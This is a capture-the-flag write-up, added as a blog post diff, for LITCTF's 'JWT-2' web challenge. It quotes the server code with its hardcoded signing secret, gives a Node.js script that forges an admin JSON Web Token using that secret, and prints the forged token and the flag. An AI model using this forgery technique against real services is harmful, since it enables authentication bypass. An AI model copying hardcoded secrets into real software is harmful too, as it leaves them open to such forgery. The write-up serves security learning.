@@ -1,0 +1,160 @@
+---
+layout: post
+title:  "JWT-2"
+description: Further exploiting JSON Web Tokens
+date:   2024-08-14
+tags: ["Web Exploitation", "LITCTF", "JSON"]
+---
+
+
+
+# Challenge Info
+`its like jwt-1 but this one is harder.
+URL: http://litctf.org:31777/`
+
+attached: [index.ts](https://drive.google.com/uc?export=download&id=18gNp6DphcZBI5UmGjKsXhCkZvF1aIB6F&name=index.ts)
+
+![JWT-2](/assets/img/JWT-2/challenge.png)
+
+
+## Preface
+While this *is* a separate challenge, its fundamentals are heavily derived from the [first](/posts/jwt1) JWT challenge, which I heavily recommend you read first.
+
+
+## Trying the first solution
+Since this is a continuation of the **first** JWT challenge, I figured I'd try the same solution. A quick recap on how I beat the first one:
+
+1. Register an account on the given site
+2. Use Burpsuite intercept to capture the JWT associated with our account
+3. Use [jwt.io](https://jwt.io) to read the contents of our JWT
+4. Modify `admin` so that it equals to `true`
+5. Access the "GET FLAG" button with our **new** JWT and acquire flag
+
+For this challenge, while I **was** able to capture the JWT token and modify it to have `admin` set to `true`, upon actually using it, I was greeted with this:
+
+![unauthorized](/assets/img/JWT-2/unauthorized.png)
+
+## Inspecting the attached TypeScript file
+By now, I realized this challenge wouldn't be as simple as the last one, so I decided to skim through the attached TypeScript file, which I'll leave down below:
+
+```ts
+import express from "express";
+import cookieParser from "cookie-parser";
+import path from "path";
+import fs from "fs";
+import crypto from "crypto";
+
+const accounts: [string, string][] = [];
+
+const jwtSecret = "xook";
+const jwtHeader = Buffer.from(
+  JSON.stringify({ alg: "HS256", typ: "JWT" }),
+  "utf-8"
+)
+  .toString("base64")
+  .replace(/=/g, "");
+
+const sign = (payload: object) => {
+  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+    .toString("base64")
+    .replace(/=/g, "");
+    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');
+  return jwtHeader + "." + jwtPayload + "." + signature;
+
+}
+
+const app = express();
+
+const port = process.env.PORT || 3000;
+
+app.listen(port, () =>
+  console.log("server up on http://localhost:" + port.toString())
+);
+
+app.use(cookieParser());
+app.use(express.urlencoded({ extended: true }));
+
+app.use(express.static(path.join(__dirname, "site")));
+
+app.get("/flag", (req, res) => {
+  if (!req.cookies.token) {
+    console.log('no auth')
+    return res.status(403).send("Unauthorized");
+  }
+
+  try {
+    const token = req.cookies.token;
+    // split up token
+    const [header, payload, signature] = token.split(".");
+    if (!header || !payload || !signature) {
+      return res.status(403).send("Unauthorized");
+    }
+    Buffer.from(header, "base64").toString();
+    // decode payload
+    const decodedPayload = Buffer.from(payload, "base64").toString();
+    // parse payload
+```
+Just to highlight what this code does:
+
+`const [header, payload, signature] = token.split(".");`
+- splits the JWT token into its three parts; header, payload, and signature, and the `.` acts as a delimiter.
+
+`if (!req.cookies.token)`
+- checks if the token is missing, and responds with `403 Unauthorized` if it is.
+
+`Buffer.from(header,"base64").toString()` `Buffer.from(payload,"base64").toString()`
+- The header and payload are decoded from base64 to their original string format.
+
+
+However, what's really making us hit our head is the following:
+```js
+const sign = (payload: object) => {
+  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+    .toString("base64")
+    .replace(/=/g, "");
+    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');
+  return jwtHeader + "." + jwtPayload + "." + signature;
+```
+
+This removes the `=` characters from both the base64-encoded payload and signature. This is normal in JWTs though, and doesn't affect the token's validity. The main issue here isn't the removal of padding, but making sure that the token **we** craft adheres to this format.
+
+## The Solution
+
+The payload that I came up with:
+
+```js
+
+const crypto = require('crypto');
+
+const jwtSecret = "xook";
+const jwtHeader = Buffer.from(
+  JSON.stringify({ alg: "HS256", typ: "JWT" }),
+  "utf-8"
+)
+  .toString("base64")
+  .replace(/=/g, "");
+
+const sign = (payload) => {
+  const jwtPayload = Buffer.from(JSON.stringify(payload), "utf-8")
+    .toString("base64")
+    .replace(/=/g, "");
+  const signature = crypto
+    .createHmac("sha256", jwtSecret)
+    .update(jwtHeader + "." + jwtPayload)
+    .digest("base64")
+    .replace(/=/g, "");
+  return jwtHeader + "." + jwtPayload + "." + signature;
+};
+
+const payload = { name: "your_username", admin: true };
+const forgedToken = sign(payload);
+console.log(forgedToken); // This is the token you will use.
+```
+
+This payload creates a token using the `xook` secret, modifies `admin` to `true`, and removes all padding (`=` characters).
+
+Then, I replaced the old token in Burpsuite intercept with the new one: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoieW91cl91c2VybmFtZSIsImFkbWluIjp0cnVlfQ.xwxnk5ogziOC8xlMNuolHBuQDbefnLA9rATCeS7fS+s`, and hit "forward".
+
+![flag](/assets/img/JWT-2/flag.png)
+
+flag: `LITCTF{v3rifyed_thI3_Tlme_1re4DV9}`
